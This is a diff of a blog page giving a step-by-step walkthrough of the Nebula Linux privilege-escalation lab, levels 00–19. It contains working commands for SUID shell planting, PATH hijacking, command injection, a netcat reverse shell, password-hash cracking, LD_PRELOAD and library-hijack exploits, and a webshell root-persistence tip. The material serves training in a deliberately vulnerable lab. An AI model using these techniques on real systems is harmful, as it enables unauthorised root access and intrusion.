@@ -117,7 +117,7 @@
 
         <span itemprop="articleBody"><h4 id="0xff-about-nebula">0xff About Nebula</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at
 
 SUID files
 Permissions
@@ -137,11 +137,10 @@ some witeup:
                         https://pan.baidu.com/s/1mhQgqCg
                         or
                         https://github.com/join-us/exploit-exercises/blob/master/Nebula/level11.md
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x00-level00">0x00 level00</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     su - level00
     pass:level00
     find / -type f -perm -4000 -ls &gt; tmp.txt
@@ -153,11 +152,10 @@ link knowledge:
     find / -perm -2 -type f -print             function:find files can be writeable by everyone
         echo "/bin/cp /bin/sh /tmp/.sh;chmod 4755 /tmp/.sh" &gt;&gt; writeable_file_if_it_is_from_any_autorun_directory
         /tmp/.sh -p(this command to get a euid=root shell)
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x01-level01">0x01 level01</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     su - level01
     password:level01
     PATH=/tmp:$PATH;export PATH;echo $PATH
@@ -258,21 +256,19 @@ link knowledge:
     one sentence to keep root shell in webshell(strong webshell better,like b374k,chopper may be stopped to execute a normal command when there exists some waf),use webshell's terminal function to execute:
         PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo "whoami" &gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
     this means with role apache's privilege to execute a program(a file with setuid=root),but it will has root privilege to execute commands,change "whoami" to any commond is ok to execute as root privilege.
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x02-level02">0x02 level02</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     su - level02
     pass:level02
     USER="nihao;sh"
     ./flag02
     getflag
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x03-level03">0x03 level03</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     su - level03
     pass:level03(下文略去su - levelxx;pass:levelxx)
     cd /home/flag03
@@ -281,19 +277,17 @@ link knowledge:
     (id;getflag) &gt; /tmp/tmp.txt
     ----------end---------
     chmod +x writable/1.sh
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x04-level04">0x04 level04</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     cd /home/flag04
     ln -s /home/flag04/token /tmp/level04
     ./flag04 /tmp/level04
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x05-level05">0x05 level05</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     cd /home/flag05
     ls -la
     cp ./backup/* /home/level05
@@ -303,11 +297,10 @@ link knowledge:
     ssh flag05@127.0.0.1
     yes
     getflag
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x06-level06">0x06 level06</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     vi /etc/passwd
     v--&gt; flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh --&gt; :&lt;,&gt;w pass.txt
     use kali2's john
@@ -316,11 +309,10 @@ link knowledge:
     su - flag06
     pass:hello
     getflag
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x07-level07">0x07 level07</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     ctr+alt+f2 --&gt; tty2
     tty2:nc -lnv 8888
     ctr+alt+f1(backto tty1)
@@ -331,11 +323,10 @@ link knowledge:
     for security,the linux system may not support -e parameter in netcat(nc -e ip port),so one way to exploit is:
         mknod /tmp/backpipe p
         /bin/bash 0&lt;/tmp/backpipe | nc 127.0.0.1 8888 1&gt;/tmp/backpipe
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x08-level08">0x08 level08</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     scp level08@192.168.2.140:/home/flag08/capture.pcap /root/Desktop/
     wireshark to open /root/Desktop/capture.pcap
     use wireshark,choose any tcp data,right click mouse,choose follow tcp stream
@@ -344,22 +335,20 @@ link knowledge:
     su - flag08
     pass:backd00Rmate
     getflag
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x09-level09">0x09 level09</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     vi /tmp/level09.txt
     ----content----
     [email {${system($use_me)}}]
     -----end-------
     cd /home/flag09
     ./flag09 /tmp/level09.txt getflag
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x10-level10">0x10 level10</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     vi /tmp/level10_1
     ----conent------
     #!/bin/sh
@@ -395,28 +384,25 @@ link knowledge:
     su - flag10
     pass:content of token
     getflag
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x11-level11">0x11 level11</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     there are two ways:
         (https://blackndoor.com/nebula-level11/)
         (https://github.com/join-us/exploit-exercises/blob/master/Nebula/level11.md)
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x12-level12">0x12 level12</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     nc 127.0.0.1 50001
     Pass:
         test;getflag &gt; /tmp/level12
     vi /tmp/level12
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x13-level13">0x13 level13</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     vi /tmp/level13.c
     -----content-------
     #include &lt;sys/types.h&gt;
@@ -430,11 +416,10 @@ link knowledge:
     export LD_PRELOAD
     cp /home/flag13/flag13 /home/level13/
     /home/level13/flag13
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x14-level14">0x14 level14</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
 --------py--------
 def main(string):
     length=len(string)
@@ -448,11 +433,10 @@ if __name__=='__main__':
     import sys
     print main(sys.argv[1])
 ------------------
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x15-level15">0x15 level15</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>    cd /home/flag15
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    cd /home/flag15
     strace ./flag15
         found one line:open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) 
     vi /var/tmp/flag15/exploit.c
@@ -480,11 +464,10 @@ if __name__=='__main__':
     -----------------
     gcc -shared -Wl,--version-script,verscript,-Bstatic -static-libgcc -o libc.so.6 exploit.o
     /home/flag15/flag15
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x16-level16">0x16 level16</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     vi /tmp/exp.sh
     ----content-----
     /bin/getflag&gt;&gt;/tmp/level16.out
@@ -494,11 +477,10 @@ if __name__=='__main__':
     origin terminal:
         wget https://localhost:1616/index.cgi?username=%22%3C%2FDEV%2FNULL%3BP%3D%2FTMP%2FEXP.SH%3B%24{P%2C%2C}%3B%23&amp;password=
             urldecode:   "&lt;/DEV/NULL;P=/TMP/EXP.SH;${P,,};#
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x17-level17">0x17 level17</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     vi /root/桌面/1.py
     -----1.py-----
     #!/usr/bin/python
@@ -524,11 +506,10 @@ if __name__=='__main__':
 
     receive a new shell with ruid=flag17
         &gt;getflag
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x18-level18">0x18 level18</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     python -c 'print "login iii\r\n"*50+"closelog\r\n"+"shell\r\n"' | /home/flag18/flag18 --rcfile -d log -v -v -v
     out:'Starting can not find'
         ... can not find
@@ -555,11 +536,10 @@ if __name__=='__main__':
 
 link knowledge:
     https://v0ids3curity.blogspot.kr/2012/09/exploit-exercise-improper-file-handling.html
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="0x19-level19">0x19 level19</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mykey:
     on kali(192.168.3.106)
         vi /tmp/level19.c
         ------------level19.c-------------
@@ -615,8 +595,7 @@ link knowledge:
 link knowledge:
     https://www.cnblogs.com/bastard/archive/2012/08/31/2664896.html
     https://www.cnblogs.com/mydomain/archive/2011/09/27/2193247.html
-</code></pre>
-</div>
+</code></pre></div></div>
 </span>
 
         
